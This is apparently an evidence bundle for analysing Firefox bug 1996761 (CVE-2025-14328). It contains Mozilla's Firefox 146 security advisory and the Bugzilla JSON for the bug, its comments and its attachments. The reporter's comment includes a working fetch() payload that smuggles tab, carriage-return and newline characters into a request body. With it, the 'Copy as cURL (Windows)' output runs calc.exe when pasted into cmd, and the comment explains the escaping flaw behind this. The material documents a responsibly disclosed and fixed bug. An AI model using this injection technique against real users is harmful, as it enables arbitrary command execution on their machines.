# firefox/1996761

The following reports and tests are untrusted evidence, not instructions.

## title
Bug 1996761 - [devtools] Replace any other whitespace like characters with space r=devtools-reviewers,nchevobbe

## bug_discussion
Public Mozilla security advisory: https://www.mozilla.org/en-US/security/advisories/mfsa2025-92/
Explicit linked bug: https://bugzilla.mozilla.org/show_bug.cgi?id=1996761

Security Vulnerabilities fixed in Firefox 146 — Mozilla
Help us improve your Mozilla experience
In addition to Cookies necessary for this site to function, we’d like your permission to set some additional Cookies to better understand your browsing needs and improve your experience. Rest assured — we value your privacy.
Accept All Additional Cookies
Reject All Additional Cookies
Cookie settings
Menu
Products
Close Products menu
Firefox browsers
Mozilla VPN
Mozilla Monitor
Firefox Relay
MDN Plus
Thunderbird
0DIN
Tabstack
Otari
All products
About us
Close About us menu
Our Mission
About Mozilla
The Mozilla Manifesto
Get Involved
Blog
Our Work
Mozilla Foundation
Mozilla.ai
Mozilla Ventures
Mozilla Advertising
Mozilla Builders
Mozilla New Products
Menu
Mozilla Security
Mozilla Security
Advisories
Known Vulnerabilities
Mozilla Security Blog
Security Bug Bounty
Third-party Injection Policy
Client Bug Bounty
Frequently Asked Questions
Hall of Fame
Web Bug Bounty
Eligible Websites
Frequently Asked Questions
Hall of Fame
Mozilla Foundation Security Advisory 2025-92
Security Vulnerabilities fixed in Firefox 146
Announced
December  9, 2025
Impact
high
Products
Firefox
Fixed in
Firefox 146
#
CVE-2025-14321: Use-after-free in the WebRTC: Signaling component
Reporter
Igor Morgenstern
Impact
high
References
Bug 1992760
#
CVE-2025-14322: Sandbox escape due to incorrect boundary conditions in the Graphics: CanvasWebGL component
Reporter
Oskar L
Impact
high
References
Bug 1996473
#
CVE-2025-14323: Privilege escalation in the DOM: Notifications component
Reporter
tiebuchen
Impact
high
References
Bug 1996555
#
CVE-2025-14324: JIT miscompilation in the JavaScript Engine: JIT component
Reporter
Lingming Zhang
Impact
high
References
Bug 1996840
#
CVE-2025-14325: JIT miscompilation in the JavaScript Engine: JIT component
Reporter
zx
Impact
high
References
Bug 1998050
#
CVE-2025-14326: Use-after-free in the Audio/Video: GMP component
Reporter
Andrew McCreight
Impact
moderate
References
Bug 1840666
#
CVE-2025-14327: Spoofing issue in the Downloads Panel component
Reporter
Caro Kann
Impact
moderate
References
Bug 1970743
#
CVE-2025-14328: Privilege escalation in the Netmonitor component
Reporter
Ameen Basha M K
Impact
moderate
References
Bug 1996761
#
CVE-2025-14329: Privilege escalation in the Netmonitor component
Reporter
satrya wira yudha
Impact
moderate
References
Bug 1997018
#
CVE-2025-14330: JIT miscompilation in the JavaScript Engine: JIT component
Reporter
Rong Bao
Impact
moderate
References
Bug 1997503
#
CVE-2025-14331: Same-origin policy bypass in the Request Handling component
Reporter
Igor Morgenstern
Impact
moderate
References
Bug 2000218
#
CVE-2025-14332: Memory safety bugs fixed in Firefox 146 and Thunderbird 146
Reporter
Jon Coppeard, Maurice Dauer and the Mozilla Fuzzing Team
Impact
moderate
Description
Memory safety bugs present in Firefox 145 and Thunderbird 145. Some of these bugs showed evidence of memory corruption and we presume that with enough effort some of these could have been exploited to run arbitrary code.
References
Memory safety bugs fixed in Firefox 146 and Thunderbird 146
#
CVE-2025-14333: Memory safety bugs fixed in Firefox ESR 140.6, Thunderbird ESR 140.6, Firefox 146 and Thunderbird 146
Reporter
Maurice Dauer and the Mozilla Fuzzing Team
Impact
moderate
Description
Memory safety bugs present in Firefox ESR 140.5, Thunderbird ESR 140.5, Firefox 145 and Thunderbird 145. Some of these bugs showed evidence of memory corruption and we presume that with enough effort some of these could have been exploited to run arbitrary code.
References
Memory safety bugs fixed in Firefox ESR 140.6, Thunderbird ESR 140.6, Firefox 146 and Thunderbird 146
Company
Leadership
Press Center
Careers
Merch Store
Contact
Support
Product Help
File a Bug
Localize Mozilla
Security
Developers
Developer Edition
Enterprise
Tools
MDN
Firefox Release Notes
Follow @Mozilla
Bluesky
(@mozilla.org)
Instagram
(@mozilla)
LinkedIn
(@mozilla)
TikTok
(@mozilla)
Spotify
(@mozilla)
Follow @Firefox
Bluesky
(@firefox.com)
Instagram
(@firefox)
YouTube
(@firefoxchannel)
TikTok
(@firefox)
Donate
All languages
Language
English (Canadian)
English (British)
English
Donate to the not-for-profit
Mozilla Foundation
.
Portions of this content are ©1998–2026 by individual mozilla.org contributors. Content available under a
Creative Commons license
.
Website Privacy Notice
Cookies
Legal
Community Participation Guidelines
About this site

Local mainline source change explicitly names Bug 1996761:
Bug 1996761 - [devtools] Replace any other whitespace like characters with space r=devtools-reviewers,nchevobbe

Certain control characters (e.g tab or form feed) are whitespace like characters.
This replaces those with a simple space.

Differential Revision: https://phabricator.services.mozilla.com/D272425
Fixing revision candidate: 5c7b1adb9c3f08f3402dc3402cd4ddc959984e5e
The advisory can describe multiple cases; use only this bug's evidence. Validate fixing role and derive the introduction independently. The linked private bug details have not been fetched.

## saved report: https://bugzilla.mozilla.org/rest/bug/1996761
{"bugs":[{"cf_status_firefox159":"---","classification":"Components","cf_crash_signature":"","cf_tracking_firefox147":"+","last_change_time":"2026-05-28T18:24:12Z","cf_tracking_firefox_esr140":"146+","cf_has_str":"---","mentors":[],"component":"Netmonitor","cf_tracking_firefox157":"---","cf_user_story":"","comment_count":13,"id":1996761,"alias":"CVE-2025-14328","cf_status_firefox147":"fixed","cf_cab_review":"---","cc":["dmeehan@mozilla.com","firefox-test-engineering@bot.tld","hmanilla@mozilla.com","mark@wolfbeast.com","sfriedberger@mozilla.com"],"cf_status_firefox_esr140":"fixed","creation_time":"2025-10-28T07:46:12Z","product":"DevTools","mentors_detail":[],"duplicates":[],"is_open":false,"version":"unspecified","cf_webcompat_priority":"---","cf_status_firefox_esr115":"wontfix","cf_status_firefox158":"---","whiteboard":"[client-bounty-form][adv-main146+][adv-esr140.6+]","cf_status_firefox145":"wontfix","resolution":"FIXED","cf_a11y_review_project_flag":"---","keywords":["csectype-priv-escalation","reporter-external","sec-moderate"],"cf_accessibility_severity":"---","depends_on":[],"assigned_to":"hmanilla@mozilla.com","cf_tracking_firefox_esr115":"---","qa_contact":"","cf_status_firefox_esr153":"---","cf_qa_whiteboard":"[sec] [uplift] [qa-triage-done-c147/b146]","cf_last_resolved":"2025-11-23T18:06:45Z","cf_fx_points":"---","assigned_to_detail":{"real_name":"Hubert Boma Manilla (:bomsy)","name":"hmanilla@mozilla.com","id":656417,"email":"hmanilla@mozilla.com","nick":"bomsy"},"cf_tracking_firefox159":"---","op_sys":"Windows","cf_tracking_firefox146":"+","cf_tracking_firefox_relnote":"---","cc_detail":[{"name":"dmeehan@mozilla.com","real_name":"Donal Meehan [:dmeehan]","email":"dmeehan@mozilla.com","nick":"dmeehan","id":695136},{"nick":"firefox-test-engineering","email":"firefox-test-engineering@bot.tld","id":761687,"name":"firefox-test-engineering@bot.tld","real_name":"Firefox Test Engineering Bot Account"},{"real_name":"Hubert Boma Manilla (:bomsy)","name":"hmanilla@mozilla.com","email":"hmanilla@mozilla.com","nick":"bomsy","id":656417},{"real_name":"Mark Straver","name":"mark@wolfbeast.com","email":"mark@wolfbeast.com","nick":"mark","id":364942},{"id":704251,"nick":"simonf","email":"sfriedberger@mozilla.com","real_name":"Simon Friedberger [:simonf]","name":"sfriedberger@mozilla.com"}],"type":"defect","dupe_of":null,"creator_detail":{"nick":"ameenbasha111","email":"ameenbasha111@gmail.com","id":719704,"real_name":"Ameen Basha M K","name":"ameenbasha111@gmail.com"},"is_creator_accessible":true,"priority":"P2","regressed_by":[],"url":"","blocks":[1638294],"see_also":["https://bugzilla.mozilla.org/show_bug.cgi?id=1997018"],"groups":[],"cf_tracking_firefox158":"---","severity":"S3","target_milestone":"147 Branch","is_confirmed":true,"platform":"Unspecified","cf_performance_impact":"---","votes":0,"cf_webcompat_score":"---","creator":"ameenbasha111@gmail.com","status":"RESOLVED","summary":"Copy As Curl (Windows) - Code Execution via body \\n injection","cf_status_firefox157":"---","cf_fx_iteration":"---","cf_status_firefox146":"fixed","cf_tracking_firefox_esr153":"---","is_cc_accessible":true,"regressions":[],"flags":[{"type_id":803,"modification_date":"2025-11-26T19:14:09Z","id":2312933,"status":"+","setter":"dveditz@mozilla.com","name":"sec-bounty","creation_date":"2025-10-28T07:46:12Z"},{"id":2317635,"modification_date":"2025-11-23T18:06:45Z","type_id":37,"creation_date":"2025-11-23T18:06:45Z","name":"in-testsuite","setter":"ryanvm@gmail.com","status":"+"}]}],"faults":[]}

## saved report: https://bugzilla.mozilla.org/rest/bug/1996761/comment
{"bugs":{"1996761":{"comments":[{"time":"2025-10-28T07:46:12Z","is_private":false,"collapsed":false,"reactions":{},"count":0,"author":"ameenbasha111@gmail.com","attachment_id":9522812,"creation_time":"2025-10-28T07:46:12Z","creator":"ameenbasha111@gmail.com","raw_text":"Hi Team, Firefox latest on windows is vulnerable for code execution via copy as curl (windows) feature on windows, which allows attacker to execute arbitrary command on victim machine\n\nPayload:\n```\nfetch(\"/\", {\n\"credentials\": \"omit\",\n\"headers\": {\n\"Accept-Language\": \"en-US\",\n\"Content-Type\": \"text/plain\",\n},\n\"body\": '\\t \\rcalc.exe \"\\t \\n',\n\"method\": \"POST\",\n});\n```\n\nNote: It also have impact of sharing LOCAL FILE NAME with attacker by using consecutive tab chaarcters\n\n\nSteps to reproduce:\n1. Send the above request directly via console (or) embed it in html\n2. Now from network tab copy the request as curl\n3. paste it in cmd and you can find the calc popup\n\n\nTested in Nightly 146.0a1 (2025-10-27) (64-bit) on windows 11 pro\n\nI have attached the poc video too for reference","id":17736429,"tags":[],"text":"Created attachment 9522812\nFirefox-CopyAsCurl-Windows-tabcharacter.mp4\n\nHi Team, Firefox latest on windows is vulnerable for code execution via copy as curl (windows) feature on windows, which allows attacker to execute arbitrary command on victim machine\n\nPayload:\n```\nfetch(\"/\", {\n\"credentials\": \"omit\",\n\"headers\": {\n\"Accept-Language\": \"en-US\",\n\"Content-Type\": \"text/plain\",\n},\n\"body\": '\\t \\rcalc.exe \"\\t \\n',\n\"method\": \"POST\",\n});\n```\n\nNote: It also have impact of sharing LOCAL FILE NAME with attacker by using consecutive tab chaarcters\n\n\nSteps to reproduce:\n1. Send the above request directly via console (or) embed it in html\n2. Now from network tab copy the request as curl\n3. paste it in cmd and you can find the calc popup\n\n\nTested in Nightly 146.0a1 (2025-10-27) (64-bit) on windows 11 pro\n\nI have attached the poc video too for reference","bug_id":1996761},{"author":"ameenbasha111@gmail.com","reactions":{},"count":1,"collapsed":false,"time":"2025-10-28T07:48:50Z","is_private":false,"tags":[],"text":"Root cause is when \" is used it is escaped with ^ character so \" become => ^\" and immediate usage of \\t include the local file name which will enclose with \" and we can free to use \\n (or) \\r to break to new line and execute Code\n\n\n1. Impact: Code Execution\n2. Local File Names Disclosure (Complete Directory file names disclosure to attacker)","bug_id":1996761,"creator":"ameenbasha111@gmail.com","raw_text":"Root cause is when \" is used it is escaped with ^ character so \" become => ^\" and immediate usage of \\t include the local file name which will enclose with \" and we can free to use \\n (or) \\r to break to new line and execute Code\n\n\n1. Impact: Code Execution\n2. Local File Names Disclosure (Complete Directory file names disclosure to attacker)","id":17736432,"attachment_id":null,"creation_time":"2025-10-28T07:48:50Z"},{"author":"hmanilla@mozilla.com","count":2,"reactions":{},"collapsed":false,"is_private":false,"time":"2025-11-13T10:00:01Z","text":"Created attachment 9526438\n(secure)","bug_id":1996761,"tags":[],"id":17761041,"creator":"hmanilla@mozilla.com","raw_text":"","creation_time":"2025-11-13T10:00:01Z","attachment_id":9526438},{"collapsed":false,"time":"2025-11-22T19:42:50Z","is_private":false,"author":"pulsebot@bmo.tld","count":3,"reactions":{},"attachment_id":null,"creation_time":"2025-11-22T19:42:50Z","tags":[],"text":"Pushed by hmanilla@mozilla.com:\nhttps://github.com/mozilla-firefox/firefox/commit/5c7b1adb9c3f\nhttps://hg.mozilla.org/integration/autoland/rev/fc7eb99824bb\n[devtools] Replace any other whitespace like characters with space r=devtools-reviewers,nchevobbe","bug_id":1996761,"raw_text":"Pushed by hmanilla@mozilla.com:\nhttps://github.com/mozilla-firefox/firefox/commit/5c7b1adb9c3f\nhttps://hg.mozilla.org/integration/autoland/rev/fc7eb99824bb\n[devtools] Replace any other whitespace like characters with space r=devtools-reviewers,nchevobbe","creator":"pulsebot@bmo.tld","id":17775364},{"text":"https://hg-edge.mozilla.org/mozilla-central/rev/fc7eb99824bb","bug_id":1996761,"tags":[],"id":17775627,"raw_text":"https://hg-edge.mozilla.org/mozilla-central/rev/fc7eb99824bb","creator":"ryanvm@gmail.com","creation_time":"2025-11-23T18:06:45Z","attachment_id":null,"author":"ryanvm@gmail.com","count":4,"reactions":{},"collapsed":false,"is_private":false,"time":"2025-11-23T18:06:45Z"},{"time":"2025-11-24T12:04:08Z","is_private":false,"collapsed":false,"count":5,"reactions":{},"author":"release-mgmt-account-bot@mozilla.tld","attachment_id":null,"creation_time":"2025-11-24T12:04:08Z","creator":"release-mgmt-account-bot@mozilla.tld","raw_text":"The patch landed in nightly and beta is affected.\n:bomsy, is this bug important enough to require an uplift?\n- If yes, please nominate the patch for beta approval.\n - See https://wiki.mozilla.org/Release_Management/Requesting_an_Uplift for documentation on how to request an uplift.\n- If no, please set `status-firefox146` to `wontfix`.\n\nFor more information, please visit [BugBot documentation](https://wiki.mozilla.org/BugBot#uplift_beta.py).","id":17778142,"tags":[],"bug_id":1996761,"text":"The patch landed in nightly and beta is affected.\n:bomsy, is this bug important enough to require an uplift?\n- If yes, please nominate the patch for beta approval.\n - See https://wiki.mozilla.org/Release_Management/Requesting_an_Uplift for documentation on how to request an uplift.\n- If no, please set `status-firefox146` to `wontfix`.\n\nFor more information, please visit [BugBot documentation](https://wiki.mozilla.org/BugBot#uplift_beta.py)."},{"time":"2025-11-24T14:17:21Z","is_private":false,"collapsed":false,"reactions":{},"count":6,"author":"dmeehan@mozilla.com","attachment_id":null,"creation_time":"2025-11-24T14:17:21Z","creator":"dmeehan@mozilla.com","raw_text":":bomsy, to add to Comment 5, this will also need an uplift request for ESR140. It grafts cleanly with Bug 1997018 applied.","id":17778400,"tags":[],"text":":bomsy, to add to Comment 5, this will also need an uplift request for ESR140. It grafts cleanly with Bug 1997018 applied.","bug_id":1996761},{"attachment_id":null,"creation_time":"2025-11-26T21:30:49Z","raw_text":"### firefox-esr140 Uplift Approval Request\n- **User impact if declined**: With clever combinations which would include certain whitespace-like characters in the curl commands apps on user local machine can be executed.\n- **Code covered by automated testing**: yes\n- **Fix verified in Nightly**: yes\n- **Needs manual QE test**: no\n- **Steps to reproduce for manual QE testing**: \n- **Risk associated with taking this patch**: low\n- **Explanation of risk level**: Small js patch with regexp to escape the whitespace-like characters.\n- **String changes made/needed**: None\n- **Is Android affected?**: no","creator":"phab-bot@bmo.tld","id":17782580,"tags":[],"bug_id":1996761,"text":"### firefox-esr140 Uplift Approval Request\n- **User impact if declined**: With clever combinations which would include certain whitespace-like characters in the curl commands apps on user local machine can be executed.\n- **Code covered by automated testing**: yes\n- **Fix verified in Nightly**: yes\n- **Needs manual QE test**: no\n- **Steps to reproduce for manual QE testing**: \n- **Risk associated with taking this patch**: low\n- **Explanation of risk level**: Small js patch with regexp to escape the whitespace-like characters.\n- **String changes made/needed**: None\n- **Is Android affected?**: no","time":"2025-11-26T21:30:49Z","is_private":false,"collapsed":false,"reactions":{},"count":7,"author":"phab-bot@bmo.tld"},{"collapsed":false,"is_private":false,"time":"2025-11-26T21:30:49Z","author":"hmanilla@mozilla.com","reactions":{},"count":8,"creation_time":"2025-11-26T21:30:49Z","attachment_id":9529372,"text":"Created attachment 9529372\n(secure)\n\n\nCertain control characters (e.g tab or form feed) are whitespace like characters.\nThis replaces those with a simple space.\n\nOriginal Revision: https://phabricator.services.mozilla.com/D272425","bug_id":1996761,"tags":[],"id":17782581,"raw_text":"\nCertain control characters (e.g tab or form feed) are whitespace like characters.\nThis replaces those with a simple space.\n\nOriginal Revision: https://phabricator.services.mozilla.com/D272425","creator":"hmanilla@mozilla.com"},{"tags":[],"text":"Comment on attachment 9526438\n(secure)\n\n### Beta/Release Uplift Approval Request\n* **User impact if declined/Reason for urgency**: With clever combinations which would include certain whitespace-like characters in the curl commands apps on user local machine can be executed.\n* **Is this code covered by automated tests?**: Yes\n* **Has the fix been verified in Nightly?**: Yes\n* **Needs manual test from QE?**: No\n* **If yes, steps to reproduce**: \n* **List of other uplifts needed**: None\n* **Risk to taking this patch**: Low\n* **Why is the change risky/not risky? (and alternatives if risky)**: Small js patch with regexp to escape the whitespace-like characters.\n* **String changes made/needed**: None\n* **Is Android affected?**: No","bug_id":1996761,"raw_text":"### Beta/Release Uplift Approval Request\n* **User impact if declined/Reason for urgency**: With clever combinations which would include certain whitespace-like characters in the curl commands apps on user local machine can be executed.\n* **Is this code covered by automated tests?**: Yes\n* **Has the fix been verified in Nightly?**: Yes\n* **Needs manual test from QE?**: No\n* **If yes, steps to reproduce**: \n* **List of other uplifts needed**: None\n* **Risk to taking this patch**: Low\n* **Why is the change risky/not risky? (and alternatives if risky)**: Small js patch with regexp to escape the whitespace-like characters.\n* **String changes made/needed**: None\n* **Is Android affected?**: No","creator":"hmanilla@mozilla.com","id":17783584,"attachment_id":9526438,"creation_time":"2025-11-27T15:01:59Z","author":"hmanilla@mozilla.com","reactions":{},"count":9,"collapsed":false,"time":"2025-11-27T15:01:59Z","is_private":false},{"attachment_id":9526438,"creation_time":"2025-11-27T17:11:54Z","tags":[],"text":"Comment on attachment 9526438\n(secure)\n\nApproved for 146.0b9","bug_id":1996761,"creator":"dmeehan@mozilla.com","raw_text":"Approved for 146.0b9","id":17783771,"collapsed":false,"time":"2025-11-27T17:11:54Z","is_private":false,"author":"dmeehan@mozilla.com","reactions":{},"count":10},{"time":"2025-11-27T17:25:54Z","is_private":false,"collapsed":false,"reactions":{},"count":11,"author":"pulsebot@bmo.tld","attachment_id":null,"creation_time":"2025-11-27T17:25:54Z","creator":"pulsebot@bmo.tld","raw_text":"https://github.com/mozilla-firefox/firefox/commit/07dc29cb7ae1\nhttps://hg.mozilla.org/releases/mozilla-beta/rev/1687390e25bf","id":17783782,"tags":["uplift"],"text":"https://github.com/mozilla-firefox/firefox/commit/07dc29cb7ae1\nhttps://hg.mozilla.org/releases/mozilla-beta/rev/1687390e25bf","bug_id":1996761},{"reactions":{},"count":12,"author":"pulsebot@bmo.tld","is_private":false,"time":"2025-11-27T17:33:27Z","collapsed":false,"id":17783794,"creator":"pulsebot@bmo.tld","raw_text":"https://hg.mozilla.org/releases/mozilla-esr140/rev/fa4c895cd0db","text":"https://hg.mozilla.org/releases/mozilla-esr140/rev/fa4c895cd0db","bug_id":1996761,"tags":["uplift"],"creation_time":"2025-11-27T17:33:27Z","attachment_id":null}]}},"comments":{}}

## saved report: https://bugzilla.mozilla.org/rest/bug/1996761/attachment?exclude_fields=data
{"bugs":{"1996761":[{"file_name":"Firefox-CopyAsCurl-Windows-tabcharacter.mp4","last_change_time":"2025-10-28T07:46:12Z","summary":"Firefox-CopyAsCurl-Windows-tabcharacter.mp4","size":2682353,"creator_detail":{"email":"ameenbasha111@gmail.com","nick":"ameenbasha111","id":719704,"name":"ameenbasha111@gmail.com","real_name":"Ameen Basha M K"},"creation_time":"2025-10-28T07:46:12Z","is_obsolete":0,"is_private":0,"is_patch":0,"attacher":"ameenbasha111@gmail.com","id":9522812,"content_type":"video/mp4","bug_id":1996761,"flags":[],"description":"Firefox-CopyAsCurl-Windows-tabcharacter.mp4","creator":"ameenbasha111@gmail.com"},{"creator":"hmanilla@mozilla.com","description":"(secure)","content_type":"text/x-phabricator-request","bug_id":1996761,"flags":[{"type_id":721,"modification_date":"2025-11-27T17:11:54Z","id":2318444,"status":"+","setter":"dmeehan@mozilla.com","name":"approval-mozilla-beta","creation_date":"2025-11-27T15:01:59Z"}],"attacher":"hmanilla@mozilla.com","id":9526438,"is_patch":0,"is_private":0,"creation_time":"2025-11-13T10:00:01Z","is_obsolete":0,"size":48,"creator_detail":{"email":"hmanilla@mozilla.com","nick":"bomsy","real_name":"Hubert Boma Manilla (:bomsy)","name":"hmanilla@mozilla.com","id":656417},"summary":"(secure)","file_name":"phabricator-D272425-url.txt","last_change_time":"2025-11-27T17:11:54Z"},{"content_type":"text/x-phabricator-request","bug_id":1996761,"flags":[{"type_id":968,"setter":"phab-bot@bmo.tld","status":"+","id":2318319,"modification_date":"2025-11-27T17:30:38Z","creation_date":"2025-11-26T21:30:49Z","name":"approval-mozilla-esr140"}],"attacher":"hmanilla@mozilla.com","id":9529372,"description":"(secure)","creator":"hmanilla@mozilla.com","summary":"(secure)","file_name":"phabricator-D274179-url.txt","last_change_time":"2025-11-27T17:30:38Z","size":48,"creator_detail":{"email":"hmanilla@mozilla.com","nick":"bomsy","real_name":"Hubert Boma Manilla (:bomsy)","name":"hmanilla@mozilla.com","id":656417},"creation_time":"2025-11-26T21:30:49Z","is_obsolete":0,"is_patch":0,"is_private":0}]},"attachments":{}}
